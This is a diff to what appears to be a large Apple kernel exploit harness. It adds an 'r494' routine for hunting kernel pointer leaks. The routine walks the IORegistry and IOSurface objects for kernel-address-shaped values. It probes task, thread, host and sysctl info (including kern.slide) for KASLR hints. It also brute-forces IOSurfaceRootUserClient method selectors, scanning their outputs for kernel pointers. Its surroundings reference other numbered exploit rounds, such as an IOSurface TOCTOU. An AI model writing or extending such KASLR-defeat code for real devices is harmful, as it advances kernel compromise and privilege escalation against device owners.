@@ -25588,6 +25588,409 @@ r493_done:
     fflush(stdout);
 }
 
+/* ============================================================
+ * r494: Systematic kernel pointer leak hunt
+ *
+ * 1. IORegistry deep traversal — search for properties with
+ *    pointer-sized values (0xfffffff...)
+ * 2. IOSurface kernel property queries (GetAllocSize, etc.)
+ * 3. mach task_info / thread_info for kernel address leaks
+ * 4. mach_port_kernel_object / kobject
+ * 5. host_info / processor_info for KASLR hints
+ * 6. IOSurfaceRootUserClient external method probing
+ * ============================================================ */
+
+static void r494_scan_registry_entry(io_registry_entry_t entry,
+                                     const char *path, int depth) {
+    if (depth > 3) return;
+
+    CFMutableDictionaryRef props = NULL;
+    kern_return_t kr = IORegistryEntryCreateCFProperties(entry, &props,
+        kCFAllocatorDefault, 0);
+    if (kr != KERN_SUCCESS || !props) return;
+
+    CFIndex n = CFDictionaryGetCount(props);
+    if (n > 0 && n < 500) {
+        const void **keys = malloc(sizeof(void*) * n);
+        const void **vals = malloc(sizeof(void*) * n);
+        CFDictionaryGetKeysAndValues(props, keys, vals);
+        for (CFIndex i = 0; i < n; i++) {
+            char kbuf[256] = {0};
+            if (CFGetTypeID(keys[i]) == CFStringGetTypeID())
+                CFStringGetCString(keys[i], kbuf, 256, kCFStringEncodingUTF8);
+
+            CFTypeRef v = vals[i];
+            if (CFGetTypeID(v) == CFNumberGetTypeID()) {
+                int64_t nv = 0;
+                CFNumberGetValue(v, kCFNumberSInt64Type, &nv);
+                uint64_t uv = (uint64_t)nv;
+                if ((uv >> 36) == 0xfffffff || (uv >> 36) == 0xfffffffe ||
+                    (uv >> 32) == 0xfffffff0 || (uv > 0xffff000000000000ULL && uv != 0xFFFFFFFFFFFFFFFFULL)) {
+                    rlog("  *** KPTR %s/%s = 0x%llx ***\n", path, kbuf,
+                         (unsigned long long)uv);
+                }
+            } else if (CFGetTypeID(v) == CFDataGetTypeID()) {
+                CFIndex dlen = CFDataGetLength(v);
+                const UInt8 *d = CFDataGetBytePtr(v);
+                for (CFIndex j = 0; j + 7 < dlen; j += 8) {
+                    uint64_t pv;
+                    memcpy(&pv, d + j, 8);
+                    if ((pv >> 36) == 0xfffffff || (pv >> 36) == 0xfffffffe) {
+                        rlog("  *** KPTR %s/%s data[%ld] = 0x%llx ***\n",
+                             path, kbuf, (long)j, (unsigned long long)pv);
+                    }
+                }
+            }
+        }
+        free(keys);
+        free(vals);
+    }
+    CFRelease(props);
+
+    io_iterator_t children;
+    kr = IORegistryEntryGetChildIterator(entry, kIOServicePlane, &children);
+    if (kr == KERN_SUCCESS) {
+        io_registry_entry_t child;
+        int idx = 0;
+        while ((child = IOIteratorNext(children)) && idx < 20) {
+            io_name_t name;
+            IORegistryEntryGetName(child, name);
+            char cpath[512];
+            snprintf(cpath, sizeof(cpath), "%s/%s", path, name);
+            r494_scan_registry_entry(child, cpath, depth + 1);
+            IOObjectRelease(child);
+            idx++;
+        }
+        IOObjectRelease(children);
+    }
+}
+
+static void r494_exploit(void) {
+    rlog("\n=== r494: Systematic kernel pointer leak hunt ===\n\n");
+    fflush(stdout);
+
+    /* Part 1: IORegistry deep scan for kernel pointers */
+    rlog("--- Part 1: IORegistry kptr scan ---\n");
+    {
+        const char *classes[] = {
+            "IOSurfaceRoot", "AppleAVE2Driver", "AppleAVD",
+            "AppleARMIODevice", "IOUserClient", "AppleT8160PMGR",
+            "AppleSPMI", "AppleARMPE"
+        };
+        for (int c = 0; c < 8; c++) {
+            CFMutableDictionaryRef match = IOServiceMatching(classes[c]);
+            if (!match) continue;
+            io_iterator_t iter;
+            kern_return_t kr = IOServiceGetMatchingServices(
+                kIOMainPortDefault, match, &iter);
+            if (kr != KERN_SUCCESS) continue;
+            io_service_t svc;
+            int idx = 0;
+            while ((svc = IOIteratorNext(iter)) && idx < 3) {
+                io_name_t name;
+                IORegistryEntryGetName(svc, name);
+                rlog("  Scanning %s (%s)...\n", classes[c], name);
+                r494_scan_registry_entry(svc, name, 0);
+                IOObjectRelease(svc);
+                idx++;
+            }
+            IOObjectRelease(iter);
+        }
+    }
+    fflush(stdout);
+
+    /* Part 2: IOSurface kernel property queries */
+    rlog("\n--- Part 2: IOSurface kernel property queries ---\n");
+    {
+        CFMutableDictionaryRef sprops = CFDictionaryCreateMutable(
+            kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+        int w = 64, h = 64, bpr = 256, bpe = 4, pf = 0x42475241; /* BGRA */
+        CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
+        CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
+        CFNumberRef nbpr = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpr);
+        CFNumberRef nbpe = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpe);
+        CFNumberRef npf = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pf);
+        CFDictionarySetValue(sprops, kIOSurfaceWidth, nw);
+        CFDictionarySetValue(sprops, kIOSurfaceHeight, nh);
+        CFDictionarySetValue(sprops, kIOSurfaceBytesPerRow, nbpr);
+        CFDictionarySetValue(sprops, kIOSurfaceBytesPerElement, nbpe);
+        CFDictionarySetValue(sprops, kIOSurfacePixelFormat, npf);
+        int allocsz = 64 * 256;
+        CFNumberRef nas = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &allocsz);
+        CFDictionarySetValue(sprops, kIOSurfaceAllocSize, nas);
+        CFRelease(nw); CFRelease(nh); CFRelease(nbpr);
+        CFRelease(nbpe); CFRelease(npf); CFRelease(nas);
+
+        IOSurfaceRef surf = IOSurfaceCreate(sprops);
+        CFRelease(sprops);
+        if (surf) {
+            uint32_t sid = IOSurfaceGetID(surf);
+            size_t actual_alloc = IOSurfaceGetAllocSize(surf);
+            void *ba = IOSurfaceGetBaseAddress(surf);
+            rlog("  Surface ID=%u AllocSize=%zu BaseAddr=%p\n",
+                 sid, actual_alloc, ba);
+            rlog("  Width=%zu Height=%zu BPR=%zu BPE=%zu PF=0x%x\n",
+                 IOSurfaceGetWidth(surf), IOSurfaceGetHeight(surf),
+                 IOSurfaceGetBytesPerRow(surf), IOSurfaceGetBytesPerElement(surf),
+                 IOSurfaceGetPixelFormat(surf));
+            rlog("  Seed=%u PlaneCount=%zu IsInUse=%d\n",
+                 IOSurfaceGetSeed(surf), IOSurfaceGetPlaneCount(surf),
+                 IOSurfaceIsInUse(surf));
+
+            /* Try IOSurfaceLookup — does it return kernel pointers? */
+            IOSurfaceRef looked = IOSurfaceLookup(sid);
+            rlog("  Lookup(ID=%u) = %p (orig=%p)\n", sid, looked, surf);
+            if (looked) CFRelease(looked);
+
+            /* Check IOSurface property maximum values */
+            rlog("  PropertyMaximum(Width)=%zu\n",
+                 IOSurfaceGetPropertyMaximum(kIOSurfaceWidth));
+            rlog("  PropertyMaximum(Height)=%zu\n",
+                 IOSurfaceGetPropertyMaximum(kIOSurfaceHeight));
+            rlog("  PropertyMaximum(BPR)=%zu\n",
+                 IOSurfaceGetPropertyMaximum(kIOSurfaceBytesPerRow));
+            rlog("  PropertyMaximum(BPE)=%zu\n",
+                 IOSurfaceGetPropertyMaximum(kIOSurfaceBytesPerElement));
+            rlog("  PropertyMaximum(PlaneCount)=%zu\n",
+                 IOSurfaceGetPropertyMaximum(kIOSurfacePlaneCount));
+            rlog("  PropertyAlignment(BPR)=%zu\n",
+                 IOSurfaceGetPropertyAlignment(kIOSurfaceBytesPerRow));
+
+            /* Dump raw IOSurface CFType — might have hidden properties */
+            CFStringRef desc = CFCopyDescription(surf);
+            if (desc) {
+                char buf[2048];
+                CFStringGetCString(desc, buf, 2048, kCFStringEncodingUTF8);
+                rlog("  CFDesc: %.500s\n", buf);
+                /* Scan for hex kptr patterns */
+                for (int p = 0; buf[p] && p < 2000; p++) {
+                    if (buf[p] == '0' && buf[p+1] == 'x') {
+                        uint64_t v = strtoull(buf + p, NULL, 16);
+                        if ((v >> 36) == 0xfffffff || (v >> 36) == 0xfffffffe) {
+                            rlog("  *** KPTR in CFDesc at %d: 0x%llx ***\n",
+                                 p, (unsigned long long)v);
+                        }
+                    }
+                }
+                CFRelease(desc);
+            }
+
+            CFRelease(surf);
+        }
+    }
+    fflush(stdout);
+
+    /* Part 3: mach task/thread info for kernel address leaks */
+    rlog("\n--- Part 3: mach task/thread info ---\n");
+    {
+        task_t self_task = mach_task_self();
+
+        /* task_info TASK_DYLD_INFO — sometimes leaks kernel slide */
+        struct task_dyld_info dyld_info;
+        mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
+        kern_return_t kr = task_info(self_task, TASK_DYLD_INFO,
+            (task_info_t)&dyld_info, &cnt);
+        rlog("  TASK_DYLD_INFO: kr=%d all_image_info_addr=0x%llx "
+             "all_image_info_size=%llu all_image_info_format=%d\n",
+             kr, dyld_info.all_image_info_addr,
+             dyld_info.all_image_info_size, dyld_info.all_image_info_format);
+        if ((dyld_info.all_image_info_addr >> 36) == 0xfffffff) {
+            rlog("  *** KPTR in dyld_info! ***\n");
+        }
+
+        /* TASK_VM_INFO — may contain kernel-related addresses */
+        task_vm_info_data_t vm_info;
+        cnt = TASK_VM_INFO_COUNT;
+        kr = task_info(self_task, TASK_VM_INFO, (task_info_t)&vm_info, &cnt);
+        rlog("  TASK_VM_INFO: kr=%d\n", kr);
+        if (kr == KERN_SUCCESS) {
+            rlog("    virtual_size=%llu resident_size=%llu\n",
+                 vm_info.virtual_size, vm_info.resident_size);
+            rlog("    phys_footprint=%llu min_address=0x%llx max_address=0x%llx\n",
+                 vm_info.phys_footprint, vm_info.min_address, vm_info.max_address);
+            if ((vm_info.min_address >> 36) == 0xfffffff)
+                rlog("  *** KPTR in min_address! ***\n");
+            if ((vm_info.max_address >> 36) == 0xfffffff)
+                rlog("  *** KPTR in max_address! ***\n");
+        }
+
+        /* Thread info */
+        thread_act_array_t threads;
+        mach_msg_type_number_t tcnt;
+        kr = task_threads(self_task, &threads, &tcnt);
+        rlog("  task_threads: kr=%d count=%u\n", kr, tcnt);
+        if (kr == KERN_SUCCESS && tcnt > 0) {
+            arm_thread_state64_t state;
+            mach_msg_type_number_t scnt = ARM_THREAD_STATE64_COUNT;
+            kr = thread_get_state(threads[0], ARM_THREAD_STATE64,
+                (thread_state_t)&state, &scnt);
+            rlog("  thread_get_state[0]: kr=%d\n", kr);
+            if (kr == KERN_SUCCESS) {
+                rlog("    pc=0x%llx lr=0x%llx sp=0x%llx fp=0x%llx\n",
+                     (uint64_t)state.__pc, (uint64_t)state.__lr,
+                     (uint64_t)state.__sp, (uint64_t)state.__fp);
+            }
+            for (mach_msg_type_number_t t = 0; t < tcnt; t++)
+                mach_port_deallocate(self_task, threads[t]);
+            mach_vm_deallocate(self_task, (mach_vm_address_t)threads,
+                tcnt * sizeof(thread_act_t));
+        }
+    }
+    fflush(stdout);
+
+    /* Part 4: host_info / processor_info */
+    rlog("\n--- Part 4: host_info / processor_info ---\n");
+    {
+        host_t host = mach_host_self();
+
+        host_basic_info_data_t hbi;
+        mach_msg_type_number_t cnt = HOST_BASIC_INFO_COUNT;
+        kern_return_t kr = host_info(host, HOST_BASIC_INFO,
+            (host_info_t)&hbi, &cnt);
+        rlog("  HOST_BASIC_INFO: kr=%d max_cpus=%d avail_cpus=%d "
+             "memory_size=%u max_mem=%llu\n",
+             kr, hbi.max_cpus, hbi.avail_cpus,
+             hbi.memory_size, hbi.max_mem);
+
+        /* processor_info — might leak scheduler addresses */
+        processor_basic_info_data_t pbi;
+        cnt = PROCESSOR_BASIC_INFO_COUNT;
+        kr = processor_info(0, PROCESSOR_BASIC_INFO,
+            &host, (processor_info_t)&pbi, &cnt);
+        rlog("  PROCESSOR_BASIC_INFO[0]: kr=%d type=%d subtype=%d\n",
+             kr, pbi.cpu_type, pbi.cpu_subtype);
+    }
+    fflush(stdout);
+
+    /* Part 5: sysctl probes for kernel addresses */
+    rlog("\n--- Part 5: sysctl kernel address probes ---\n");
+    {
+        /* kern.bootargs — sometimes reveals info */
+        char bootargs[512] = {0};
+        size_t blen = sizeof(bootargs);
+        int r = sysctlbyname("kern.bootargs", bootargs, &blen, NULL, 0);
+        rlog("  kern.bootargs: r=%d \"%s\"\n", r, bootargs);
+
+        /* kern.osversion */
+        char osver[64] = {0};
+        size_t ovlen = sizeof(osver);
+        sysctlbyname("kern.osversion", osver, &ovlen, NULL, 0);
+        rlog("  kern.osversion: \"%s\"\n", osver);
+
+        /* hw.memsize */
+        uint64_t memsize = 0;
+        size_t mslen = sizeof(memsize);
+        sysctlbyname("hw.memsize", &memsize, &mslen, NULL, 0);
+        rlog("  hw.memsize: %llu\n", (unsigned long long)memsize);
+
+        /* kern.bootsessionuuid — unique per boot */
+        char buuid[64] = {0};
+        size_t ulen = sizeof(buuid);
+        sysctlbyname("kern.bootsessionuuid", buuid, &ulen, NULL, 0);
+        rlog("  kern.bootsessionuuid: \"%s\"\n", buuid);
+
+        /* machdep.cpu.* — ARM doesn't have these but try */
+        uint64_t slide = 0;
+        size_t slen = sizeof(slide);
+        r = sysctlbyname("kern.slide", &slide, &slen, NULL, 0);
+        rlog("  kern.slide: r=%d val=0x%llx\n", r, (unsigned long long)slide);
+
+        /* Try proc_pidinfo for our PID */
+        int mypid = getpid();
+        /* PROC_PIDTASKINFO = 4 */
+        struct {
+            uint64_t pti_virtual_size;
+            uint64_t pti_resident_size;
+            uint64_t pti_total_user;
+            uint64_t pti_total_system;
+            uint64_t pti_threads_user;
+            uint64_t pti_threads_system;
+            int32_t pti_policy;
+            int32_t pti_faults;
+            int32_t pti_pageins;
+            int32_t pti_cow_faults;
+            int32_t pti_messages_sent;
+            int32_t pti_messages_received;
+            int32_t pti_syscalls_mach;
+            int32_t pti_syscalls_unix;
+            int32_t pti_csw;
+            int32_t pti_threadnum;
+            int32_t pti_numrunning;
+            int32_t pti_priority;
+        } taskinfo;
+        extern int proc_pidinfo(int pid, int flavor, uint64_t arg,
+            void *buffer, int buffersize);
+        int pret = proc_pidinfo(mypid, 4, 0, &taskinfo, sizeof(taskinfo));
+        rlog("  proc_pidinfo(TASKINFO): ret=%d vsize=%llu rsize=%llu "
+             "threads=%d\n", pret,
+             (unsigned long long)taskinfo.pti_virtual_size,
+             (unsigned long long)taskinfo.pti_resident_size,
+             taskinfo.pti_threadnum);
+    }
+    fflush(stdout);
+
+    /* Part 6: IOSurfaceRootUserClient external method probe */
+    rlog("\n--- Part 6: IOSurfaceRoot user client probe ---\n");
+    {
+        CFMutableDictionaryRef match = IOServiceMatching("IOSurfaceRoot");
+        io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, match);
+        rlog("  IOSurfaceRoot service: 0x%x\n", svc);
+        if (svc) {
+            io_connect_t conn = 0;
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+            rlog("  IOServiceOpen type=0: kr=%d conn=0x%x\n", kr, conn);
+            if (kr == KERN_SUCCESS && conn) {
+                /* Try various selectors to see what's available */
+                for (uint32_t sel = 0; sel < 40; sel++) {
+                    uint64_t out[16] = {0};
+                    uint32_t ocnt = 16;
+                    kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, out, &ocnt);
+                    if (kr != 0xe00002c2 /* kIOReturnBadArgument */ &&
+                        kr != 0xe00002bc /* kIOReturnUnsupported */) {
+                        rlog("    sel=%u: kr=0x%x ocnt=%u", sel, kr, ocnt);
+                        for (uint32_t j = 0; j < ocnt && j < 4; j++) {
+                            rlog(" out[%u]=0x%llx", j, (unsigned long long)out[j]);
+                            if ((out[j] >> 36) == 0xfffffff ||
+                                (out[j] >> 36) == 0xfffffffe) {
+                                rlog(" ***KPTR***");
+                            }
+                        }
+                        rlog("\n");
+                    }
+                }
+
+                /* Also try struct methods */
+                for (uint32_t sel = 0; sel < 40; sel++) {
+                    uint8_t outbuf[256] = {0};
+                    size_t outlen = 256;
+                    kr = IOConnectCallStructMethod(conn, sel, NULL, 0,
+                        outbuf, &outlen);
+                    if (kr != 0xe00002c2 && kr != 0xe00002bc && outlen > 0) {
+                        rlog("    struct sel=%u: kr=0x%x outlen=%zu", sel, kr, outlen);
+                        /* Scan for kptrs */
+                        for (size_t j = 0; j + 7 < outlen; j += 8) {
+                            uint64_t v;
+                            memcpy(&v, outbuf + j, 8);
+                            if ((v >> 36) == 0xfffffff || (v >> 36) == 0xfffffffe) {
+                                rlog(" KPTR@%zu=0x%llx", j, (unsigned long long)v);
+                            }
+                        }
+                        rlog("\n");
+                    }
+                }
+
+                IOServiceClose(conn);
+            }
+            IOObjectRelease(svc);
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r494 complete ===\n");
+    fflush(stdout);
+}
+
 static void r471_exploit(void) {
     rlog("\n=== r471: 8-page IOSurface + large IOV TOCTOU ===\n\n");
     fflush(stdout);
@@ -95665,6 +96068,12 @@ new_modes:
             r484_exploit();
             goto done;
         }
+        if (rounds == 498) {
+            rlog("*** rounds=498: Systematic kernel pointer leak hunt ***\n\n");
+            fflush(stdout);
+            r494_exploit();
+            goto done;
+        }
         if (rounds == 497) {
             rlog("*** rounds=497: VT property deep inspection + profile probing ***\n\n");
             fflush(stdout);
@@ -98656,7 +99065,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
